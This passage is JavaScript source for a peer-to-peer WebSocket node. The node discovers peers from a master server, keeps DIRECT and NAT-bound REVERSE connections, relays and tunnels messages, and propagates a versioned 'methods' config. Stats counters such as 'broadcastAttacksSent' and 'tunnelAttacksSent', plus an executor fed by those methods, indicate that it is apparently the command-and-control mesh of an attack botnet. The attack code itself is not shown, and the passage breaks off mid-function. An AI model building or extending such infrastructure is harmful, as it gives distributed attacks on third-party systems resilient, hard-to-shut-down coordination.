import EventEmitter from 'events';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { normalizeMethodsToLocalPaths } from './methodSync.js';
import EncryptionManager from './encryption.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ============================================================
// UPGRADE v5.1: Fix method sync flooding
//
// Changes from v5.0:
// 1. handleMethodsVersionResponse: add _pendingMethodsRequestVersion guard
//    to prevent duplicate requests when multiple peers report same new version
// 2. handleMethodsUpdateNotification: early-exit if version already matches ours
//    to prevent unnecessary sync cascade
// 3. propagateMethodsUpdateImmediate: skip peers already on current version
//    AND track in-flight propagation per version to prevent re-entry flood
// 4. sendMethodsConfigToPeer: skip push if peer already has this version
// 5. startMethodSyncChecker: deduplicated version check before requesting sync
// ============================================================

class P2PHybridNode extends EventEmitter {
  constructor(config, executor, methodsConfig) {
    super();

    this.config = config;
    this.executor = executor;
    this.methodsConfig = methodsConfig || {};
    this.nodeId = config.NODE.ID;
    this.nodeIp = config.NODE.IP;
    this.nodePort = config.SERVER.PORT;
    this.nodeMode = 'DIRECT'; // will be updated via setNodeMode()

    // --- Peer state ---
    this.peers = new Map();           // nodeId -> peerInfo (connected)
    this.connectionLocks = new Map(); // nodeId -> lockTimestamp
    this.knownPeers = new Map();      // nodeId -> peerMeta (discovered)
    this.peerBlacklist = new Map();   // nodeId -> {reason, until}

    // --- REVERSE support ---
    this.reversePeers = new Map();
    this.pendingRelayRequests = new Map();

    // --- Referral system ---
    this.receivedReferrals = new Map();
    this.referralTimestamps = new Map();

    // --- Permanent failure lock ---
    // Peer yang gagal konek >= maxConnectionAttempts kali dikunci PERMANEN.
    // Lock TIDAK punya TTL — hanya dibuka saat peer itu sendiri datang konek inbound ke kita.
    // Map: nodeId -> { lockedAt, lockedAtISO, attempts, reason }
    this.permanentFailureLocks = new Map();

    // Track jumlah kegagalan outbound per peer (akumulasi, reset saat koneksi berhasil)
    // Map: nodeId -> failureCount
    this._outboundFailureCounts = new Map();

    // --- Message queue ---
    this.messageQueue = new Map();

    // --- REVERSE peer registry ---
    this.knownReversePeers = new Map();

    // --- Methods versioning ---
    this.methodsVersionHash = null;
    this.methodsLastUpdate = Date.now();
    this.methodUpdatePropagationLock = new Map();

    // FIX: Guard to prevent duplicate methods requests for the same version
    // when multiple peers simultaneously report a newer version
    this._pendingMethodsRequestVersion = null;

    // FIX: Track which versions we've already fully propagated to avoid re-flood
    this._propagatedVersions = new Map(); // versionHash -> timestamp

    // --- File cache ---
    this.fileCache = new Map();

    // --- WebSocket server ---
    this.wss = null;
    this.isServerReady = false;

    // --- Stats ---
    this.stats = {
      directConnections: 0,
      relayedConnections: 0,
      reverseNodeConnections: 0,
      messagesReceived: 0,
      messagesSent: 0,
      messagesQueued: 0,
      messagesRelayed: 0,
      peersDiscovered: 0,
      connectionAttempts: 0,
      connectionFailures: 0,
      connectionSuccesses: 0,
      methodSyncsFromPeers: 0,
      methodSyncsToMaster: 0,
      filesShared: 0,
      filesReceived: 0,
      lastDiscovery: null,
      lastAutoConnect: null,
      lastMethodSync: null,
      referralsSent: 0,
      referralsReceived: 0,
      connectionsViaReferral: 0,
      requestHandlersCleaned: 0,
      memoryLeaksPrevent: 0,
      encryptedMessagesSent: 0,
      encryptedMessagesReceived: 0,
      plainMessagesSent: 0,
      plainMessagesReceived: 0,
      broadcastAttacksSent: 0,
      broadcastAttacksFailed: 0,
      tunnelMessagesForwarded: 0,
      reverseHandshakes: 0,
      tunnelAttacksSent: 0,
      reverseListBroadcasts: 0,
      // FIX: Track skipped syncs for observability
      methodSyncSkippedUpToDate: 0,
      methodSyncSkippedDuplicate: 0,
      // Jumlah peer yang dikunci permanen karena gagal konek >= maxConnectionAttempts
      permanentLocksTotal: 0,
      // Jumlah lock permanen yang di-unlock karena peer itu minta join inbound
      permanentLockUnlockedByInbound: 0,
    };

    // --- P2P config ---
    this.p2pConfig = {
      enabled: config.P2P?.ENABLED !== false,
      discoveryInterval: config.P2P?.DISCOVERY_INTERVAL || 60000,
      peerTimeout: config.P2P?.PEER_TIMEOUT || 180000,
      maxPeers: config.P2P?.MAX_PEERS || 50,
      autoConnect: config.P2P?.AUTO_CONNECT !== false,
      relayFallback: config.P2P?.RELAY_FALLBACK !== false,
      heartbeatInterval: config.P2P?.HEARTBEAT_INTERVAL || 30000,
      connectionTimeout: config.P2P?.CONNECTION_TIMEOUT || 10000,
      maxConnectionAttempts: 3,
      connectionBackoffMs: 5000,
      blacklistDuration: 300000,
      messageQueueSize: 100,
      autoConnectDelay: 10000,
      cleanupInterval: 60000,
      methodSyncInterval: 120000,
      preferP2PSync: true,
      maxReferralsToSend: 5,
      referralExpiryMs: 300000,
      connectionLockTimeout: 30000,
      maxPropagationHops: 5,
      propagationCooldown: 10000,

      reverseP2PEnabled: true,
      reverseReconnectInterval: 30000,
      reverseHeartbeatInterval: 45000,
      reverseRegistrationTimeout: 15000,
      masterSignalingEnabled: true,
      masterSignalingInterval: 90000,
    };

    // --- Intervals ---
    this.discoveryInterval = null;
    this.peerCleanupInterval = null;
    this.heartbeatInterval = null;
    this.autoConnectInterval = null;
    this.methodSyncInterval = null;
    this.handlerCleanupInterval = null;
    this.reverseReconnectInterval = null;
    this.masterSignalingInterval = null;

    this.isShuttingDown = false;

    // --- Request handler registry ---
    this.requestHandlers = new Map();
    this.requestHandlerTimestamps = new Map();

    // --- Master connectivity ---
    this.masterReachable = false;
    this.lastMasterCheck = null;

    // FIX: Initialize nodeReachable here — previously only set externally via
    // index.js (p2pNode.nodeReachable = ...) without an initial value, causing
    // getStatus() to return undefined for this field.
    this.nodeReachable = false;
    this.nodeReachableLastChecked = null;

    // --- Encryption ---
    this.encryptionManager = null;
    if (config.ENCRYPTION?.ENABLED) {
      try {
        this.encryptionManager = new EncryptionManager({
          ...config,
          ENCRYPTION: {
            ...config.ENCRYPTION,
            NODE_ID: config.NODE.ID
          }
        });
        console.log('[P2P] Encryption manager initialized', {
          enabled: true,
          algorithm: config.ENCRYPTION.ALGORITHM,
          version: config.ENCRYPTION.VERSION
        });
      } catch (error) {
        console.error('[P2P] Failed to initialize encryption:', error.message);
        this.encryptionManager = null;
      }
    }

    console.log('[P2P] P2P Hybrid Node initialized (v5.1 DIRECT+REVERSE)', {
      nodeId: this.nodeId,
      enabled: this.p2pConfig.enabled,
      maxPeers: this.p2pConfig.maxPeers,
      encryption: !!this.encryptionManager
    });
  }

  // ==========================================================
  // ENCRYPTION HELPERS
  // ==========================================================

  setEncryptionManager(manager) {
    if (manager && manager instanceof EncryptionManager) {
      this.encryptionManager = manager;
      console.log('[P2P] Encryption manager updated');
    }
  }

  isEncryptionEnabled() {
    return !!(
      this.encryptionManager &&
      this.config.ENCRYPTION?.ENABLED &&
      typeof this.encryptionManager.createSecureMessage === 'function' &&
      typeof this.encryptionManager.processSecureMessage === 'function'
    );
  }

  encryptMessage(message, messageType = 'p2p_message') {
    if (!this.isEncryptionEnabled()) {
      return { encrypted: false, data: message };
    }
    try {
      const encrypted = this.encryptionManager.createSecureMessage(message, messageType);
      return { encrypted: true, data: encrypted };
    } catch (error) {
      console.error('[P2P-ENCRYPT] Failed to encrypt message:', error.message);
      return { encrypted: false, data: message };
    }
  }

  decryptMessage(data) {
    if (!data || typeof data !== 'object') {
      this.stats.plainMessagesReceived++;
      return { success: true, encrypted: false, data };
    }

    if (data.envelope === 'secure' && this.isEncryptionEnabled()) {
      try {
        const result = this.encryptionManager.processSecureMessage(data);
        if (result.success) {
          this.stats.encryptedMessagesReceived++;
          return { success: true, encrypted: true, data: result.data, metadata: result.metadata };
        }
        console.error('[P2P-DECRYPT] Failed to decrypt:', result.error);
        return { success: false, encrypted: true, error: result.error };
      } catch (error) {
        console.error('[P2P-DECRYPT] Decryption error:', error.message);
        return { success: false, encrypted: true, error: error.message };
      }
    } else if (data.envelope === 'plain') {
      this.stats.plainMessagesReceived++;
      return { success: true, encrypted: false, data: data.payload };
    }

    this.stats.plainMessagesReceived++;
    return { success: true, encrypted: false, data };
  }

  // ==========================================================
  // NODE MODE
  // ==========================================================

  setNodeMode(mode) {
    if (mode !== this.nodeMode) {
      console.log(`[P2P] Node mode changing: ${this.nodeMode} → ${mode}`);
    }
    this.nodeMode = mode;

    // FIX: Keep config.NODE.MODE in sync so heartbeat.js getNodeMode() agrees
    if (this.config.NODE) this.config.NODE.MODE = mode;

    if (mode === 'REVERSE' && this.isServerReady) {
      const delayMs = this.p2pConfig.masterSignalingEnabled ? 6000 : 500;
      console.log(`[P2P] REVERSE mode: will attempt outbound connect in ${delayMs}ms`);
      setTimeout(() => {
        if (!this.isShuttingDown) {
          this._scheduleReverseOutboundConnect();
        }
      }, delayMs);
    }
  }

  // FIX: Expose a setter for nodeReachable so index.js can call setNodeReachable()
  // instead of directly setting p2pNode.nodeReachable = ..., ensuring the timestamp
  // and any future logic are properly maintained.
  setNodeReachable(reachable) {
    if (reachable !== this.nodeReachable) {
      console.log(`[P2P] Node reachable: ${this.nodeReachable} → ${reachable}`);
    }
    this.nodeReachable = !!reachable;
    this.nodeReachableLastChecked = Date.now();
  }

  setMasterReachable(reachable) {
    if (reachable !== this.masterReachable) {
      console.log(`[P2P] Master reachable: ${this.masterReachable} → ${reachable}`);
    }
    this.masterReachable = !!reachable;
    this.lastMasterCheck = Date.now();
  }

  // ==========================================================
  // METHODS CONFIG
  // ==========================================================

  updateMethodsConfig(newConfig) {
    if (newConfig && typeof newConfig === 'object') {
      this.methodsConfig = newConfig;
      this.updateMethodsVersion();
      console.log(`[P2P] Methods config updated: ${Object.keys(this.methodsConfig).length} methods`);
      return true;
    }
    return false;
  }

  updateMethodsVersion() {
    try {
      const keys = Object.keys(this.methodsConfig).sort();
      const normalized = JSON.stringify(this.methodsConfig, keys);
      this.methodsVersionHash = crypto.createHash('sha256').update(normalized).digest('hex');
      this.methodsLastUpdate = Date.now();
    } catch (error) {
      console.error('[P2P-METHODS] Failed to update version hash:', error.message);
    }
  }

  // ==========================================================
  // SERVER STARTUP
  // ==========================================================

  async startP2PServer(fastifyServer) {
    if (!this.p2pConfig.enabled) {
      console.log('[P2P] P2P is disabled');
      return false;
    }

    if (this.isServerReady && this.wss) {
      console.log('[P2P-SERVER] P2P server already started');
      return true;
    }

    try {
      this.wss = new WebSocketServer({
        noServer: true,
        clientTracking: true,
        perMessageDeflate: false
      });

      fastifyServer.server.on('upgrade', (request, socket, head) => {
        try {
          const url = new URL(request.url, `http://${request.headers.host}`);
          if (url.pathname === '/p2p') {
            this.wss.handleUpgrade(request, socket, head, (ws) => {
              this.wss.emit('connection', ws, request);
            });
          } else {
            socket.destroy();
          }
        } catch (error) {
          console.error('[P2P-SERVER] Upgrade error:', error.message);
          socket.destroy();
        }
      });

      this.wss.on('connection', (ws, request) => {
        this.handleIncomingPeerConnection(ws, request);
      });

      this.wss.on('error', (error) => {
        console.error('[P2P-SERVER] WebSocket server error:', error.message);
      });

      this.isServerReady = true;
      console.log(`[P2P-SERVER] P2P server started on port ${this.nodePort} (encryption: ${this.isEncryptionEnabled()})`);

      this.updateMethodsVersion();

      await this.checkMasterConnectivity();

      setTimeout(() => this.startMasterSignaling(), 3000);
      setTimeout(() => this.startPeerCleanup(), 5000);
      setTimeout(() => this.startPeerHeartbeat(), 4000);
      setTimeout(() => this.startHandlerCleanup(), 6000);
      setTimeout(() => this.startAutoConnector(), 12000);
      setTimeout(() => this.startMethodSyncChecker(), 30000);
      setTimeout(() => this.startReverseReconnect(), 8000);

      console.log('[P2P-SERVER] Background tasks scheduled');
      return true;

    } catch (error) {
      console.error('[P2P-SERVER] Failed to start P2P server:', error.message);
      this.cleanup();
      return false;
    }
  }

  // ==========================================================
  // MASTER SIGNALING
  // ==========================================================

  startMasterSignaling() {
    if (!this.p2pConfig.masterSignalingEnabled) return;
    if (!this.config.MASTER?.URL) return;

    if (this.masterSignalingInterval) {
      clearInterval(this.masterSignalingInterval);
    }

    console.log(`[P2P-SIGNAL] Master signaling started (every ${this.p2pConfig.masterSignalingInterval}ms)`);

    this._doMasterSignaling();

    this.masterSignalingInterval = setInterval(() => {
      if (!this.isShuttingDown) {
        this._doMasterSignaling();
      }
    }, this.p2pConfig.masterSignalingInterval);
  }

  async _doMasterSignaling() {
    if (!this.config.MASTER?.URL) return;

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);

      const response = await globalThis.fetch(`${this.config.MASTER.URL}/api/nodes`, {
        signal: controller.signal,
        headers: { 'X-Node-ID': this.nodeId, 'X-Node-Mode': this.nodeMode }
      });

      clearTimeout(timeout);

      if (!response.ok) {
        this.masterReachable = false;
        return;
      }

      this.masterReachable = true;
      this.lastMasterCheck = Date.now();
      this.stats.lastDiscovery = Date.now();

      const data = await response.json();
      const nodes = Array.isArray(data.nodes) ? data.nodes : [];

      let newPeers = 0;
      const now = Date.now();

      for (const node of nodes) {
        if (!node.node_id || node.node_id === this.nodeId) continue;

        const normalizedPort = this.normalizePort(node.port);
        const nodeMode = node.mode
          ? node.mode
          : (node.connection_type === 'websocket' ? 'REVERSE' : 'DIRECT');

        if (nodeMode === 'REVERSE') {
          const existing = this.knownPeers.get(node.node_id);
          if (!existing) {
            newPeers++;
          }
          this.knownPeers.set(node.node_id, {
            nodeId: node.node_id,
            ip: node.ip || null,
            port: normalizedPort,
            mode: 'REVERSE',
            reachable: false,
            canConnectTo: false,
            capabilities: null,
            methodsVersion: node.methods_version || null,
            methodsCount: node.methods_count || 0,
            lastUpdate: now
          });
        } else {
          const existing = this.knownPeers.get(node.node_id);
          if (!existing) {
            newPeers++;
            this.stats.peersDiscovered++;
          }
          this.knownPeers.set(node.node_id, {
            nodeId: node.node_id,
            ip: node.ip,
            port: normalizedPort,
            mode: 'DIRECT',
            reachable: node.reachable !== false,
            canConnectTo: true,
            capabilities: null,
            methodsVersion: node.methods_version || null,
            methodsCount: node.methods_count || 0,
            lastUpdate: now
          });
        }
      }

      const directCount = Array.from(this.knownPeers.values()).filter(p => p.canConnectTo).length;
      const reverseCount = Array.from(this.knownPeers.values()).filter(p => !p.canConnectTo).length;

      console.log(
        `[P2P-SIGNAL] Peers from master: ${nodes.length} total, ` +
        `${directCount} DIRECT (connectable), ${reverseCount} REVERSE, ` +
        `${newPeers} new. Mode: ${this.nodeMode}`
      );

      if (nodes.length === 0) {
        console.log('[P2P-SIGNAL] ⚠ Master returned empty nodes list — check /api/nodes endpoint');
      }

      if (this.nodeMode === 'REVERSE') {
        if (directCount > 0) {
          this._scheduleReverseOutboundConnect();
        } else {
          console.log('[P2P-SIGNAL] ⚠ REVERSE node: no DIRECT peers found to connect to');
        }
      }

    } catch (error) {
      if (error.name !== 'AbortError') {
        console.log('[P2P-SIGNAL] Master signaling error:', error.message);
      }
      this.masterReachable = false;
    }
  }

  // ==========================================================
  // REVERSE NODE OUTBOUND CONNECTION
  // ==========================================================

  _scheduleReverseOutboundConnect() {
    if (this.isShuttingDown) return;
    if (!this.p2pConfig.reverseP2PEnabled) return;

    if (this._reverseConnectScheduled) return;
    this._reverseConnectScheduled = true;

    setTimeout(() => {
      this._reverseConnectScheduled = false;
      this._doReverseOutboundConnect();
    }, 3000);
  }

  async _doReverseOutboundConnect() {
    if (this.isShuttingDown) return;

    const availableSlots = this.p2pConfig.maxPeers - this.peers.size - this.connectionLocks.size;
    if (availableSlots <= 0) return;

    const directPeers = Array.from(this.knownPeers.values()).filter(peer => {
      return peer.canConnectTo &&
        peer.mode === 'DIRECT' &&
        peer.ip &&
        peer.port &&
        peer.nodeId !== this.nodeId &&
        !this.peers.has(peer.nodeId) &&
        !this.connectionLocks.has(peer.nodeId) &&
        !this.isBlacklisted(peer.nodeId); // isBlacklisted sudah cover permanentFailureLocks
    });

    if (directPeers.length === 0) {
      const total = this.knownPeers.size;
      const nonConnectable = Array.from(this.knownPeers.values()).filter(p => !p.canConnectTo).length;
      const alreadyConnected = Array.from(this.knownPeers.values()).filter(p => this.peers.has(p.nodeId)).length;
      const blacklisted = Array.from(this.knownPeers.values()).filter(p => this.isBlacklisted(p.nodeId)).length;
      console.log(
        `[P2P-REVERSE-OUT] No connectable DIRECT peers. ` +
        `Known: ${total}, REVERSE/non-connectable: ${nonConnectable}, ` +
        `already-connected: ${alreadyConnected}, blacklisted: ${blacklisted}`
      );
      return;
    }

    console.log(`[P2P-REVERSE-OUT] REVERSE node connecting to ${Math.min(directPeers.length, availableSlots)} DIRECT peer(s)...`);

    let connected = 0;
    for (const peer of directPeers.slice(0, availableSlots)) {
      if (this.isShuttingDown) break;
      try {
        const result = await this.connectToPeer(peer.nodeId, peer);
        if (result.success && !result.existing) {
          connected++;
          console.log(`[P2P-REVERSE-OUT] ✓ Connected to DIRECT peer ${peer.nodeId} at ${peer.ip}:${peer.port}`);
        }
      } catch (err) {
        console.error(`[P2P-REVERSE-OUT] Error connecting to ${peer.nodeId}:`, err.message);
      }
      await new Promise(r => setTimeout(r, 1000));
    }

    if (connected > 0) {
      console.log(`[P2P-REVERSE-OUT] ✓ Connected to ${connected} DIRECT peer(s)`);
    }
  }

  startReverseReconnect() {
    if (this.reverseReconnectInterval) clearInterval(this.reverseReconnectInterval);

    this.reverseReconnectInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      if (this.nodeMode !== 'REVERSE') return;

      const directPeerCount = Array.from(this.peers.values())
        .filter(p => p.mode === 'DIRECT' || p.remoteMode === 'DIRECT').length;

      if (directPeerCount < 2) {
        console.log(`[P2P-REVERSE-RECONNECT] Only ${directPeerCount} DIRECT peer(s), attempting reconnect...`);
        this._scheduleReverseOutboundConnect();
      }
    }, this.p2pConfig.reverseReconnectInterval);

    console.log('[P2P-REVERSE-RECONNECT] REVERSE reconnect checker started');
  }

  // ==========================================================
  // INCOMING CONNECTION HANDLER
  // ==========================================================

  handleIncomingPeerConnection(ws, request) {
    const remoteNodeId = request.headers['x-node-id'];
    const remoteIpRaw = request.headers['x-forwarded-for'] || request.socket.remoteAddress;
    const remoteMode = request.headers['x-node-mode'] || 'DIRECT';
    const remotePortHeader = request.headers['x-node-port'];
    const remotePort = remotePortHeader ? parseInt(remotePortHeader, 10) : null;
    const remoteEncryption = request.headers['x-encryption'] === 'enabled';

    const remoteIp = typeof remoteIpRaw === 'string'
      ? remoteIpRaw.replace('::ffff:', '')
      : remoteIpRaw;

    console.log('[P2P-SERVER] New incoming peer connection:', {
      remoteNodeId,
      remoteIp,
      remotePort,
      remoteMode,
      encryption: remoteEncryption
    });

    if (!remoteNodeId) {
      ws.close(4000, 'Missing node ID');
      return;
    }

    if (remoteNodeId === this.nodeId) {
      ws.close(4001, 'Cannot connect to self');
      return;
    }

    // Cek apakah peer ini di-permanent-lock karena sebelumnya gagal outbound
    // Kalau iya: unlock dulu (peer ini yang datang ke kita = sign bahwa peer aktif)
    // lalu lanjut proses koneksi seperti biasa
    if (this.isPermanentlyLocked(remoteNodeId)) {
      this._unlockPeerByInbound(remoteNodeId);
      console.log(`[P2P-LOCK] Peer ${remoteNodeId} datang inbound — lock dibuka, koneksi dilanjutkan`);
    } else if (this.isBlacklisted(remoteNodeId)) {
      // Temporary blacklist (bukan permanent lock) — tetap tolak
      ws.close(4002, 'Blacklisted');
      return;
    }

    const isReverseNode = remoteMode === 'REVERSE';

    this.knownPeers.set(remoteNodeId, {
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: remotePort,
      mode: remoteMode,
      reachable: !isReverseNode,
      canConnectTo: !isReverseNode,
      capabilities: null,
      methodsVersion: null,
      methodsCount: 0,
      lastUpdate: Date.now(),
      supportsEncryption: remoteEncryption,
      isReverseNode
    });

    if (this.peers.size >= this.p2pConfig.maxPeers) {
      const referrals = this.getPeerReferrals(remoteNodeId);
      this.stats.referralsSent++;

      try {
        const rejectMessage = {
          type: 'connection_rejected',
          reason: 'max_peers_reached',
          maxPeers: this.p2pConfig.maxPeers,
          currentPeers: this.peers.size,
          referrals,
          referralCount: referrals.length,
          nodeInfo: { nodeId: this.nodeId, ip: this.nodeIp, port: this.nodePort }
        };
        const encrypted = this.encryptMessage(rejectMessage, 'connection_rejected');
        ws.send(JSON.stringify(encrypted.data));
      } catch (error) {
        console.error('[P2P-SERVER] Failed to send referrals:', error.message);
      }

      setTimeout(() => ws.close(4003, 'Max peers reached'), 500);
      return;
    }

    if (this.peers.has(remoteNodeId)) {
      console.log('[P2P-SERVER] Peer already connected, replacing old connection');
      const oldPeer = this.peers.get(remoteNodeId);
      try { oldPeer.ws.close(); } catch {}
      this.peers.delete(remoteNodeId);
    }

    const now = Date.now();
    const peerInfo = {
      ws,
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: remotePort,
      mode: this.nodeMode,
      remoteMode: remoteMode,
      connected: true,
      direct: true,
      isReverseNode,
      lastSeen: now,
      lastHeartbeat: now,
      messagesReceived: 0,
      messagesSent: 0,
      connectedAt: now,
      capabilities: null,
      methodsVersion: null,
      methodsCount: 0,
      supportsEncryption: remoteEncryption,
      encryptedMessages: 0,
      plainMessages: 0
    };

    this.peers.set(remoteNodeId, peerInfo);
    this.connectionLocks.delete(remoteNodeId);

    if (isReverseNode) {
      this.reversePeers.set(remoteNodeId, ws);
      this.stats.reverseNodeConnections++;
      console.log(`[P2P-SERVER] REVERSE node ${remoteNodeId} connected (will act as relay target)`);

      setTimeout(() => {
        if (!this.isShuttingDown) {
          this.broadcastReverseList();
        }
      }, 2000);
    }

    this.stats.directConnections++;
    this.stats.connectionSuccesses++;

    const welcomeMessage = {
      type: 'welcome',
      nodeId: this.nodeId,
      ip: this.nodeIp,
      port: this.nodePort,
      mode: this.nodeMode,
      timestamp: now,
      capabilities: {
        encryption: this.isEncryptionEnabled(),
        methods: Object.keys(this.methodsConfig),
        methodsVersion: this.methodsVersionHash,
        methodsCount: Object.keys(this.methodsConfig).length,
        relay: this.p2pConfig.relayFallback && this.masterReachable,
        tunnel: true,
        fileSharing: true,
        referrals: true,
        version: '5.1',
        nodeMode: this.nodeMode
      }
    };

    const encrypted = this.encryptMessage(welcomeMessage, 'welcome');
    this.sendToPeer(remoteNodeId, encrypted.data);

    ws.on('message', (data) => {
      this.handlePeerMessage(remoteNodeId, data);
    });

    ws.on('close', (code, reason) => {
      console.log(`[P2P] Peer ${remoteNodeId} disconnected (code: ${code})`);
      if (isReverseNode) {
        this.reversePeers.delete(remoteNodeId);
        console.log(`[P2P] REVERSE node ${remoteNodeId} removed from relay pool`);
      }
      this.handlePeerDisconnected(remoteNodeId, code, reason);
    });

    ws.on('error', (error) => {
      console.error(`[P2P] Peer ${remoteNodeId} error:`, error.message);
    });

    ws.on('pong', () => {
      const p = this.peers.get(remoteNodeId);
      if (p) p.lastSeen = Date.now();
    });

    this.emit('peer_connected', {
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: remotePort,
      mode: remoteMode,
      direct: true,
      encrypted: encrypted.encrypted,
      isReverseNode
    });

    this.processQueuedMessages(remoteNodeId);

    console.log(
      `[P2P] Peer ${remoteNodeId} (mode:${remoteMode}) connected ` +
      `(${this.peers.size}/${this.p2pConfig.maxPeers}, reversePool: ${this.reversePeers.size})`
    );
  }

  // ==========================================================
  // OUTBOUND CONNECTION
  // ==========================================================

  async connectToPeer(nodeId, peerInfo, retryAttempt = 0) {
    // retryAttempt: dipakai untuk logging saja.
    // Jumlah kegagalan sesungguhnya ditrek di this._outboundFailureCounts.
    // Lock permanen terjadi saat _outboundFailureCounts[nodeId] >= maxConnectionAttempts.
    if (nodeId === this.nodeId) {
      return { success: false, error: 'Cannot connect to self' };
    }

    const normalizedPort = this.normalizePort(peerInfo.port);

    if (peerInfo.ip === this.nodeIp && normalizedPort === this.nodePort) {
      return { success: false, error: 'Cannot connect to self (same IP:port)' };
    }

    if (peerInfo.mode === 'REVERSE' && peerInfo.canConnectTo === false) {
      return { success: false, error: 'Cannot connect to REVERSE mode node' };
    }

    if (this.peers.has(nodeId)) {
      return { success: true, existing: true };
    }

    if (this.isBlacklisted(nodeId)) {
      const lockEntry = this.permanentFailureLocks.get(nodeId);
      if (lockEntry) {
        return { success: false, error: `Peer permanently locked (${lockEntry.attempts}x gagal sejak ${lockEntry.lockedAtISO})` };
      }
      return { success: false, error: 'Peer is blacklisted' };
    }

    if (this.connectionLocks.has(nodeId)) {
      const lockTime = this.connectionLocks.get(nodeId);
      if (Date.now() - lockTime < this.p2pConfig.connectionLockTimeout) {
        return { success: false, error: 'Connection already in progress' };
      }
      this.connectionLocks.delete(nodeId);
    }

    const totalConnections = this.peers.size + this.connectionLocks.size;
    if (totalConnections >= this.p2pConfig.maxPeers) {
      return { success: false, error: 'Max peers reached' };
    }

    if (!peerInfo.ip || !normalizedPort) {
      return { success: false, error: 'Missing peer IP or port' };
    }

    this.connectionLocks.set(nodeId, Date.now());
    this.stats.connectionAttempts++;

    try {
      const wsUrl = `ws://${peerInfo.ip}:${normalizedPort}/p2p`;

      console.log(
        `[P2P] Connecting to peer ${nodeId} at ${wsUrl} ` +
        `(attempt ${retryAttempt + 1}, our mode: ${this.nodeMode})`
      );

      const ws = new WebSocket(wsUrl, {
        headers: {
          'X-Node-ID': this.nodeId,
          'X-Node-IP': this.nodeIp || 'unknown',
          'X-Node-Port': this.nodePort.toString(),
          'X-Node-Mode': this.nodeMode,
          'X-Encryption': this.isEncryptionEnabled() ? 'enabled' : 'disabled'
        },
        handshakeTimeout: this.p2pConfig.connectionTimeout
      });

      return new Promise((resolve) => {
        let resolved = false;
        let timeoutHandle = null;

        const finish = (result, keepLock = false) => {
          if (resolved) return;
          resolved = true;
          if (!keepLock) this.connectionLocks.delete(nodeId);
          if (timeoutHandle) clearTimeout(timeoutHandle);
          resolve(result);
        };

        const maybeRetry = (baseError) => {
          const totalNow = this.peers.size + this.connectionLocks.size - 1;
          if (totalNow >= this.p2pConfig.maxPeers) {
            finish({ success: false, error: 'Max peers reached' });
            return;
          }

          // Catat kegagalan — kalau sudah >= maxConnectionAttempts, kunci permanen
          this._recordOutboundFailure(nodeId);

          // Jika sudah terkunci permanen setelah pencatatan, jangan retry
          if (this.isPermanentlyLocked(nodeId)) {
            console.log(`[P2P-LOCK] ${nodeId} sudah dikunci permanen, batalkan retry`);
            finish({ success: false, error: `Permanently locked after ${this._outboundFailureCounts.get(nodeId) || 0} failures` });
            return;
          }

          // Masih bisa retry
          const currentFailures = this._outboundFailureCounts.get(nodeId) || 0;
          const maxAttempts = this.p2pConfig.maxConnectionAttempts || 3;
          if (currentFailures < maxAttempts) {
            const backoff = this.p2pConfig.connectionBackoffMs * currentFailures;
            console.log(`[P2P] ${baseError} — retry ke-${currentFailures + 1} dalam ${backoff}ms...`);
            finish({ success: false, error: baseError, willRetry: true });
            setTimeout(() => {
              if (!this.isShuttingDown && !this.isPermanentlyLocked(nodeId)) {
                this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
              }
            }, backoff);
          } else {
            finish({ success: false, error: baseError });
          }
        };

        timeoutHandle = setTimeout(() => {
          try { ws.terminate(); } catch {}
          this.stats.connectionFailures++;
          if (this.peers.has(nodeId)) {
            finish({ success: true, existing: true }, true);
            return;
          }
          maybeRetry('Connection timeout');
        }, this.p2pConfig.connectionTimeout);

        ws.on('open', () => {
          if (this.peers.size >= this.p2pConfig.maxPeers) {
            try { ws.close(4003, 'Max peers reached'); } catch {}
            finish({ success: false, error: 'Max peers reached' });
            return;
          }

          const now = Date.now();

          ws.on('message', (data) => this.handlePeerMessage(nodeId, data));

          ws.on('close', (code, reason) => {
            console.log(`[P2P] Peer ${nodeId} disconnected (code: ${code})`);
            this.handlePeerDisconnected(nodeId, code, reason);

            if (this.nodeMode === 'REVERSE' && !this.isShuttingDown) {
              const peerMeta = this.knownPeers.get(nodeId);
              if (peerMeta && peerMeta.canConnectTo) {
                console.log(`[P2P-REVERSE-OUT] DIRECT peer ${nodeId} disconnected, scheduling reconnect...`);
                setTimeout(() => {
                  if (!this.isShuttingDown && !this.peers.has(nodeId)) {
                    this.connectToPeer(nodeId, peerMeta, 0);
                  }
                }, this.p2pConfig.reverseReconnectInterval);
              }
            }
          });

          ws.on('error', (error) => {
            console.error(`[P2P] Peer ${nodeId} error:`, error.message);
          });

          ws.on('pong', () => {
            const p = this.peers.get(nodeId);
            if (p) p.lastSeen = Date.now();
          });

          const peer = {
            ws,
            nodeId,
            ip: peerInfo.ip,
            port: normalizedPort,
            mode: this.nodeMode,
            remoteMode: peerInfo.mode || 'DIRECT',
            connected: true,
            direct: true,
            isOutbound: true,
            lastSeen: now,
            lastHeartbeat: now,
            messagesReceived: 0,
            messagesSent: 0,
            connectedAt: now,
            capabilities: peerInfo.capabilities || null,
            methodsVersion: peerInfo.methodsVersion || null,
            methodsCount: peerInfo.methodsCount || 0,
            supportsEncryption: false,
            encryptedMessages: 0,
            plainMessages: 0
          };

          this.peers.set(nodeId, peer);
          this.connectionLocks.delete(nodeId);
          this.stats.directConnections++;
          this.stats.connectionSuccesses++;

          // Reset failure count karena koneksi berhasil
          this._outboundFailureCounts.delete(nodeId);

          const selfWelcome = {
            type: 'welcome',
            nodeId: this.nodeId,
            ip: this.nodeIp,
            port: this.nodePort,
            mode: this.nodeMode,
            timestamp: now,
            capabilities: {
              encryption: this.isEncryptionEnabled(),
              methods: Object.keys(this.methodsConfig),
              methodsVersion: this.methodsVersionHash,
              methodsCount: Object.keys(this.methodsConfig).length,
              relay: this.p2pConfig.relayFallback && this.masterReachable,
              tunnel: true,
              fileSharing: true,
              referrals: true,
              version: '5.1',
              nodeMode: this.nodeMode
            }
          };

          const selfWelcomeEncrypted = this.encryptMessage(selfWelcome, 'welcome');
          try {
            ws.send(JSON.stringify(selfWelcomeEncrypted.data));
